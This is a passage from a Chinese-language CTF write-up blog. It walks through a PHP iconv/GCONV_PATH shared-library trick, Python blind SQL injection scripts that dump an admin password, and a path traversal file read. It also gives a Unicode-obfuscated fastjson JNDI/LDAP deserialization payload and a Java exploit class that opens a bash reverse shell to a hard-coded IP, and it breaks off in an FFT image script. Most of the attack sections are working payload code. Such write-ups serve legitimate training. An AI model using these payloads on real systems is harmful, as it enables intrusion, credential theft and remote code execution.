class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">[0]&#x3D;&gt;</span><br><span class="line">string(1) &quot;.&quot;</span><br><span class="line">[1]&#x3D;&gt;</span><br><span class="line">string(2) &quot;..&quot;</span><br><span class="line">[2]&#x3D;&gt;</span><br><span class="line">string(13) &quot;gconv-modules&quot;</span><br><span class="line">[3]&#x3D;&gt;</span><br><span class="line">string(10) &quot;payload.so&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时即可使用如下 payload 获取 flag。（这一步比较看运气感觉，多发亿包就能触发成功了 x）</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;execute-solution?h3x&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);file_put_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.payload.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;122&quot;,&quot;Hello!!!!!!!!!!!&quot;);</span><br><span class="line"></span><br><span class="line">...&#x2F;execute-solution?h3x&#x3D;readfile(&quot;&#x2F;tmp&#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;94a14bb8-a049-43e1-af25-250d51fdae1b&#125;</span><br></pre></td></tr></table></figure><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><h4 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h4><h5 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h5><blockquote><p>参考文章：<a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p></blockquote><p>朴实无华的登录界面，使用笛卡尔积注入试探可以发现差别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span>a<span class="string">&#x27;/**/and(select/**/if((1=1),(select/**/count(*)/**/from/**/information_schema.tables/**/A,information_schema.tables/**/B,information_schema.tables/**/C),1))#&amp;username=admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password=a&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span>(<span class="keyword">select</span><span class="comment">/**/</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">0</span>),(<span class="keyword">select</span><span class="comment">/**/</span><span class="built_in">count</span>(<span class="operator">*</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span>A,information_schema.tables<span class="comment">/**/</span>B,information_schema.tables<span class="comment">/**/</span>C),<span class="number">1</span>))#<span class="operator">&amp;</span>username<span class="operator">=</span>admin</span><br></pre></td></tr></table></figure><p>如上的两个载荷在响应时间上出现了比较稳定的一秒钟左右的偏差，判断存在 SQL 注入。不过相差时间太短，将其中一个改作 <code>information_schema.columns</code> 来延长一点时间，写一个脚本来爆出所需内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;.../user/login&quot;</span></span><br><span class="line">SESSION = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    timeSpan = <span class="number">2</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            content = <span class="string">&quot;select/**/database()&quot;</span></span><br><span class="line">            sql = <span class="string">f&quot;null&#x27;/**/and(select/**/if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(select/**/count(&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;*)/**/from/**/information_schema.tables/**/A,information_schema.tables/**/B,&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns/**/C),1))# &quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: sql,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] POST startTime: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(startTime))</span><br><span class="line">            SESSION.post(url=ENV, data=param)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] POST endTime: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(endTime))</span><br><span class="line">            <span class="keyword">if</span> endTime - startTime &gt; timeSpan:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] After changing we got &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(low, high))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Now has &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((high + low - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Result now is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h5 id="创造条件的布尔盲注"><a href="#创造条件的布尔盲注" class="headerlink" title="创造条件的布尔盲注"></a>创造条件的布尔盲注</h5><p>通过尝试发现，当 SQL 语句报错的时候页面也会报 500 的错误，因此可以手动构造一个语句令结果为真或假时报错。这里以 <code>cot(0)</code> 为例子。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,cot(<span class="number">0</span>),<span class="number">0</span>) ;</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;cot(0)&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">0</span>,cot(<span class="number">0</span>),<span class="number">0</span>) ;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">0</span>,cot(<span class="number">0</span>),<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>利用这个特性可以人为地将真或假区分开来，从而实现 SQL 注入。同理，使用 <code>exp(9999999999,9999999999)</code> 这样的表达式也能实现相同效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;.../user/login&quot;</span></span><br><span class="line">SESSION = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># content = &quot;select/**/database()&quot;  #ctf</span></span><br><span class="line">            <span class="comment"># content = &quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;  #user</span></span><br><span class="line">            <span class="comment"># content = &quot;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&quot;  #id,username,password</span></span><br><span class="line">            content = <span class="string">&quot;select/**/group_concat(password)/**/from/**/user&quot;</span>  <span class="comment">#no_0ne_kn0w_th1s</span></span><br><span class="line">            sql = <span class="string">f&quot;null&#x27; or if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),1,cot(0))#&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: sql,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = SESSION.post(url=ENV, data=param)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] After changing we got &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(low, high))</span><br><span class="line">        <span class="keyword">if</span> low == high == <span class="number">32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Result is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Now has &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((high + low - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Result now is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>最终可以得到登录密码为 <code>no_0ne_kn0w_th1s</code>。</p><h4 id="文件读取-1"><a href="#文件读取-1" class="headerlink" title="文件读取"></a>文件读取</h4><p>登录 admin 之后可以来到选头像的页面，在页面源码里可以发现如下内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#roleImg&quot;).html(&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width:180px;height:180px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/searchimage?img=&#x27;+resObj.number +&#x27;.png&quot;</span>/&gt;</span>&#x27;)z</span><br></pre></td></tr></table></figure><p>尝试对这个路由使用目录穿越读取文件的套路，可以读取到 pom.xml。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;searchimage?img&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;pom.xml</span><br></pre></td></tr></table></figure><p>在 pom.xml 种可以发现如下关键依赖，版本为 1.2.27 &lt; 1.2.47。于是考虑使用 fastjson 进行 RCE。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="fastjson-exploit"><a href="#fastjson-exploit" class="headerlink" title="fastjson exploit"></a>fastjson exploit</h4><p>按网站的业务逻辑操作一次可以发现 <code>.../create</code> 路由传入的是 json，于是尝试将其作为利用点。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615983599850.c391551282ba2edfe4c7587420866c5fc162dabf.png"></p><p>使用常用的 payload 打一发，可以发现需要 bypass。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615985217182.cabdab1347ad4556533fe8435eb57d93c92f45e5.png"></p><p>尝试将 payload 的一部分字符使用 Unicode 编码以绕过关键字的过滤。得到如下的 payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;\u006E\u0061\u006D\u0065&quot;</span>:&#123;<span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073&quot;</span>,<span class="attr">&quot;\u0076\u0061\u006C&quot;</span>:<span class="string">&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;</span>&#125;,<span class="attr">&quot;x&quot;</span>:&#123;<span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0038\u002E\u0031\u0033\u0036\u002E\u0038\u002E\u0032\u0031\u0030\u003A\u0031\u0033\u0038\u0039\u002F\u0045\u0078\u0070\u006C\u006F\u0069\u0074&quot;</span>,<span class="attr">&quot;\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<a href="https://www.cnblogs.com/zpchcbd/p/11697706.html">https://www.cnblogs.com/zpchcbd/p/11697706.html</a></p></blockquote><p>在服务器上编译好如下 Exploit。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/8.136.8.210/3255 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再开启 HTTP Server 和 LDAP Server，同时使用一个 Netcat 监听反弹回来的 shell。此时将构造好的 payload 请求发送出去，即可在 Netcat 监听处获得 shell。<code>cat /flag_no_one_know_abccba.txt</code> 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;20761f89-9ed6-444a-b4ba-2c717ca99e23&#125;</span><br></pre></td></tr></table></figure><p>使用如下的 payload 亦可达成目的。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;,&quot;dataSourceName&quot;:&quot;\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0038\u002E\u0031\u0033\u0036\u002E\u0038\u002E\u0032\u0031\u0030\u003A\u0031\u0033\u0038\u0039\u002F\u0045\u0078\u0070\u006C\u006F\u0069\u0074&quot;,&quot;\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>相关部分的源码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IndexController.java */</span></span><br><span class="line"><span class="keyword">package</span> com.example.springbootdemo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootdemo.Util.FileUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootdemo.entity.Sorcerer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @author no_one_know</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *@param img</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/searchimage&quot;, produces = MediaType.IMAGE_PNG_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] t2(<span class="meta">@RequestParam</span> String img , Model model) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String path = img.trim();</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;/usr/local/springbootdemo/src/main/resources/static/images/&quot;</span>+img);</span><br><span class="line">        FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes, <span class="number">0</span>, inputStream.available());</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @param roleJson</span></span><br><span class="line"><span class="comment">    * @return number roleText</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/create&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Sorcerer <span class="title">fast</span><span class="params">(<span class="meta">@RequestParam</span> String roleJson , Model model)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(roleJson);</span></span><br><span class="line">        <span class="comment">//blacklist</span></span><br><span class="line">        String check = roleJson.toLowerCase();</span><br><span class="line">       <span class="keyword">if</span> ( check.contains(<span class="string">&quot;com&quot;</span>) || check.contains(<span class="string">&quot;@&quot;</span>) || check.contains(<span class="string">&quot;type&quot;</span>) )&#123;</span><br><span class="line">            roleJson = <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Hacker\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        JSONObject jsonObject = JSONObject.parseObject(roleJson);</span><br><span class="line">        String name = jsonObject.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        Sorcerer res = <span class="keyword">new</span> Sorcerer();</span><br><span class="line">        <span class="keyword">if</span>(name==<span class="keyword">null</span>)&#123;</span><br><span class="line">            name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Sorcerer  s = <span class="keyword">new</span> Sorcerer();</span><br><span class="line">        s.setName(name);</span><br><span class="line">        s.setNumber(name);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冰冰好像藏着秘密"><a href="#冰冰好像藏着秘密" class="headerlink" title="冰冰好像藏着秘密"></a>冰冰好像藏着秘密</h3><p>解压附件得到 FFT.png 文件（可能是下得太快了，下下来的时候是个 zip 文件，而且没有损坏。但是当时的图片里没得 flag，我还一度以为我傅里叶变换做错了。结果复现发现是附件变换过了。）CyberChef 直接对 RAR 压缩文档提取文件，得到一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615790828740.eb775a7a62b52860ef3f0a2f0a45565672fcbad8.png"></p><blockquote><p>参考文章：<a href="https://hicraigchen.medium.com/digital-image-processing-using-fourier-transform-in-python-bcb49424fd82">https://hicraigchen.medium.com/digital-image-processing-using-fourier-transform-in-python-bcb49424fd82</a></p></blockquote><p>从网上找到的现成的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">6.4</span>*<span class="number">5</span>, <span class="number">3</span>*<span class="number">5</span>), constrained_layout=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">img_c1 = cv2.imread(<span class="string">&quot;extracted_at_0x47.png&quot;</span>, <span class="number">0</span>)</span><br><span class="line">img_c2 = np.fft.fft2(img_c1)</span><br><span class="line">img_c3 = np.fft.fftshift(img_c2)</span><br><span class="line">img_c4 = np.fft.ifftshift(img_c3)</span><br><span class="line">img_c5 = np.fft.ifft2(img_c4)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">151</span>), plt.imshow(img_c1, <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Original Image&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">152</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c2)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Spectrum&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">153</span>), plt.imshow(np.log(<span class="number">1</span>+np.<span class="built_in">abs</span>(img_c3)), <span class="string">&quot;gray&quot;</span>), plt.title(<span class="string">&quot;Centered Spectrum&quot;</span>)</span><br><span 